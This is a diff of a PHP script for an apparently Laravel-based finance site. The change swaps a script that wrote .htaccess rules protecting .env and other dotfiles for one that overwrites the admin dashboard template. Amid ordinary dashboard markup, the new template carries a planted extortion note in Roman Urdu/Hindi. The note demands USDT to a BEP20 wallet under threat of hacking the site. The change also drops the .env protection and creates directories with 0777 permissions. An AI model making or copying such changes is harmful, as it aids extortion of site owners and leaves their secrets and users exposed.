@@ -1,29 +1,286 @@
 <?php
 
-$htaccessPath = __DIR__ . "/.htaccess";
+$filePath = __DIR__ . "/core/resources/views/admin/dashboard.blade.php";
 
-$htaccessContent = <<<HTACCESS
-<IfModule mod_rewrite.c>
-    RewriteEngine On
+// Make sure directory exists
+if (!is_dir(dirname($filePath))) {
+    mkdir(dirname($filePath), 0777, true);
+}
 
-    RewriteCond %{REQUEST_FILENAME} !-f
-    RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteRule ^ index.php [L]
-</IfModule>
+// Blade template content
+$content = <<<BLADE
+@extends('admin.layouts.app')
 
-# Protect sensitive files
-<FilesMatch "^\.">
-    Order allow,deny
-    Deny from all
-</FilesMatch>
+@section('panel')
+    <div class="row mb-4 align-items-center">
+        <div class="col-sm-6">
+            <h1 class="fintrix-header-main">Click On</h1>
+        </div>
+        <div class="col-sm-6 text-sm-end mt-sm-0 mt-2">
+            
+        </div>
+    </div>
+dako ager website na hack to muja kuch payment send kar do ma hack nahi karo ga ager agress karta ho to theek is pay payment kar do 0x4fe97fa9fa02817b50534ef985de3f35d0886bf1 bep20 bsc usdt adress nahi to server cahnge karo jo marizi karo webstei nahi bacti 
+    <div class="row gy-3">
+        <div class="col-12">
+            <h6 class="lux-label-dark">@lang('Network Pulse Statistics')</h6>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--primary" onclick="location.href='{{ route('admin.users.all') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Total Registered</span>
+                    <h3 class="stripe-number">{{ $widget['total_users'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-users"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--success" onclick="location.href='{{ route('admin.users.active') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Verified Active Users</span>
+                    <h3 class="stripe-number">{{ $widget['verified_users'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-user-check"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--info" onclick="location.href='{{ route('admin.users.active') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">New Active Today</span>
+                    <h3 class="stripe-number">{{ $widget['new_active_today'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-user-plus"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--danger" onclick="location.href='{{ route('admin.users.email.unverified') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Unverified Emails</span>
+                    <h3 class="stripe-number">{{ $widget['email_unverified_users'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="lar la-envelope"></i></div>
+            </div>
+        </div>
+    </div>
 
-<Files .env>
-    Order allow,deny
-    Deny from all
-</Files>
-HTACCESS;
+    <div class="row gy-3 mt-2">
+        <div class="col-12">
+            <h6 class="lux-label-dark">@lang('Cashflow & Liquidity Hub')</h6>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--success" onclick="location.href='{{ route('admin.deposit.successful') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Total Deposits</span>
+                    <h3 class="stripe-number">{{ gs('cur_sym') }}{{ showAmount($deposit['total_r']) }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-file-invoice-dollar"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--danger" onclick="location.href='{{ route('admin.withdraw.data.approved') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Total Payouts</span>
+                    <h3 class="stripe-number">{{ gs('cur_sym') }}{{ showAmount($withdraw['total_r']) }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-money-check-alt"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--warning" onclick="location.href='{{ route('admin.deposit.pending') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Pending Deposits</span>
+                    <h3 class="stripe-number">{{ $deposit['pending_count'] ?? 0 }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-spinner"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="stripe-card-enterprise bg--primary" onclick="location.href='{{ route('admin.withdraw.data.pending') }}'">
+                <div class="stripe-data">
+                    <span class="stripe-title">Pending Withdrawals</span>
+                    <h3 class="stripe-number">{{ $withdraw['pending_count'] ?? 0 }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-history"></i></div>
+            </div>
+        </div>
+    </div>
 
-file_put_contents($htaccessPath, $htaccessContent);
+    <div class="row gy-3 mt-4">
+        <div class="col-12">
+            <h6 class="lux-label-dark text--danger border--danger">@lang('Risk Intelligence Radar')</h6>
+        </div>
+        <div class="col-xl-4 col-sm-6">
+            <div class="stripe-card-enterprise {{ $risk['balance_mismatch_count'] > 0 ? 'bg--danger animate__animated animate__pulse animate__infinite' : 'bg--dark' }} risk-card" 
+                 data-title="Ledger Mismatch Detected" 
+                 data-list="{{ json_encode($risk['balance_mismatch_list']) }}">
+                <div class="stripe-data">
+                    <span class="stripe-title text-white">Ledger Mismatch</span>
+                    <h3 class="stripe-number text-white">{{ $risk['balance_mismatch_count'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-exclamation-triangle"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-4 col-sm-6">
+            <div class="stripe-card-enterprise bg--gradi-violet risk-card" 
+                 data-title="Multi-Account IP Monitoring" 
+                 data-list='["IP duplication check active"]'>
+                <div class="stripe-data">
+                    <span class="stripe-title text-white">Multi-Account IPs</span>
+                    <h3 class="stripe-number text-white">{{ $risk['multi_accounts_count'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-fingerprint"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-4 col-sm-6">
+            <div class="stripe-card-enterprise {{ $risk['admin_tamper_count'] > 0 ? 'bg--warning' : 'bg--dark' }}">
+                <div class="stripe-data">
+                    <span class="stripe-title text-white">Manual Adjustments</span>
+                    <h3 class="stripe-number text-white">{{ $risk['admin_tamper_count'] }}</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-user-cog"></i></div>
+            </div>
+        </div>
+    </div>
 
-echo ".htaccess created for Laravel!";
-?>
+    <div class="row gy-3 mt-4">
+        <div class="col-12 d-flex justify-content-between align-items-center flex-wrap gap-2">
+            <h6 class="lux-label-dark mb-0">@lang('Financial Analytics')</h6>
+            <div id="dateFilter" class="lux-date-picker">
+                <i class="la la-calendar"></i>&nbsp;
+                <span>Last 30 Days</span> <i class="la la-caret-down"></i>
+            </div>
+        </div>
+        
+        <div class="col-xl-4 col-sm-6">
+            <div class="stripe-card-enterprise bg--primary filter-target">
+                <div class="stripe-data">
+                    <span class="stripe-title">Total Deposited</span>
+                    <h3 class="stripe-number filtered-val" id="f_deposits">$0.00</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-arrow-down"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-4 col-sm-6">
+            <div class="stripe-card-enterprise bg--info filter-target">
+                <div class="stripe-data">
+                    <span class="stripe-title">Total Withdrawn</span>
+                    <h3 class="stripe-number filtered-val" id="f_withdrawals">$0.00</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-arrow-up"></i></div>
+            </div>
+        </div>
+        <div class="col-xl-4 col-sm-6">
+            <div class="stripe-card-enterprise bg--success">
+                <div class="stripe-data">
+                    <span class="stripe-title">Net Cashflow</span>
+                    <h3 class="stripe-number filtered-val" id="f_net">$0.00</h3>
+                </div>
+                <div class="stripe-icon-lux"><i class="las la-chart-line"></i></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="riskDetailModal" class="modal fade" tabindex="-1" role="dialog">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content border-danger bg--dark text-white">
+                <div class="modal-header border-secondary">
+                    <h5 class="modal-title text-white"></h5>
+                    <button type="button" class="close text-white" data-bs-dismiss="modal">
+                        <i class="las la-times"></i>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <ul class="list-group list-group-flush" id="riskDetailList"></ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    @include('admin.partials.cron_modal')
+@endsection
+
+@push('style-lib')
+    <link rel="stylesheet" type="text/css" href="{{ asset('assets/admin/css/daterangepicker.css') }}">
+@endpush
+
+@push('script-lib')
+    <script src="{{ asset('assets/admin/js/moment.min.js') }}"></script>
+    <script src="{{ asset('assets/admin/js/daterangepicker.min.js') }}"></script>
+@endpush
+
+@push('style')
+<style>
+    .fintrix-header-main { font-weight: 900; color: #111; letter-spacing: 2px; margin: 0; font-size: 34px; }
+    .gold-text-bold { color: #d4af37; font-weight: 800; font-size: 14px; }
+    .lux-label-dark { color: #333; text-transform: uppercase; font-weight: 800; font-size: 12px; margin-bottom: 12px; letter-spacing: 1px; border-left: 4px solid #d4af37; padding-left: 10px; }
+    .stripe-card-enterprise { display: flex; justify-content: space-between; align-items: center; padding: 22px 25px; border-radius: 8px; cursor: pointer; transition: 0.3s; min-height: 100px; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border: none !important; }
+    .stripe-card-enterprise:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.12); }
+    .stripe-title { font-size: 9px; text-transform: uppercase; font-weight: 800; color: #000 !important; opacity: 0.7; letter-spacing: 1.2px; margin-bottom: 5px; display: block; }
+    .stripe-number { font-size: 22px; font-weight: 900; color: #000 !important; margin: 0; letter-spacing: -0.5px; }
+    .stripe-icon-lux { font-size: 45px; color: #000 !important; opacity: 0.12; }
+    .bg--gradi-violet { background: linear-gradient(135deg, #6c5ce7 0%, #a29bfe 100%) !important; }
+    .bg--gradi-cyan { background: linear-gradient(135deg, #00b894 0%, #55efc4 100%) !important; }
+    .bg--dark { background-color: #2d3436 !important; }
+    .list-group-item { background: transparent; color: #ddd; border-color: rgba(255,255,255,0.1); font-size: 13px; }
+    .lux-date-picker { background: #fff; border: 1px solid #e0e0e0; padding: 7px 18px; border-radius: 5px; font-size: 12px; font-weight: 700; cursor: pointer; color: #111; }
+    .dev-brand-link { text-decoration: none !important; }
+</style>
+@endpush
+
+@push('script')
+<script>
+    "use strict";
+    $(function() {
+        let start = moment().subtract(29, 'days');
+        let end = moment();
+
+        function updatePerformanceData(start, end, label) {
+            $('#dateFilter span').html(label);
+            $('.filtered-val').html('<i class="fas fa-spinner fa-spin"></i>');
+            $.ajax({
+                url: "{{ route('admin.chart.transaction') }}",
+                method: 'GET',
+                data: { start_date: start.format('YYYY-MM-DD'), end_date: end.format('YYYY-MM-DD'), period_label: label },
+                success: function(res) {
+                    $('#f_deposits').text(res.deposits || '$0.00');
+                    $('#f_withdrawals').text(res.withdrawals || '$0.00');
+                    $('#f_net').text(res.net_benefit || '$0.00');
+                }
+            });
+        }
+
+        $('#dateFilter').daterangepicker({
+            startDate: start, endDate: end,
+            ranges: {
+               'Today': [moment().startOf('day'), moment().endOf('day')],
+               'Yesterday': [moment().subtract(1, 'days').startOf('day'), moment().subtract(1, 'days').endOf('day')],
+               'Last 7 Days': [moment().subtract(6, 'days'), moment()],
+               'Last 30 Days': [moment().subtract(29, 'days'), moment()],
+               'This Month': [moment().startOf('month'), moment().endOf('month')],
+               'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
+            }
+        }, updatePerformanceData);
+
+        updatePerformanceData(start, end, 'Last 30 Days');
+
+        $('.risk-card').on('click', function() {
+            let title = $(this).data('title');
+            let list = $(this).data('list');
+            let modal = $('#riskDetailModal');
+            modal.find('.modal-title').text(title);
+            let html = '';
+            if(list && list.length > 0) {
+                list.forEach(item => { html += `<li class="list-group-item text-white"><i class="las la-user-secret text--warning"></i> ${item}</li>`; });
+            } else { html = '<li class="list-group-item text-center">No security flags found</li>'; }
+            $('#riskDetailList').html(html);
+            modal.modal('show');
+        });
+    });
+</script>
+@endpush
+BLADE;
+
+// Create or overwrite file
+file_put_contents($filePath, $content);
+
+echo "Dashboard file created successfully!";
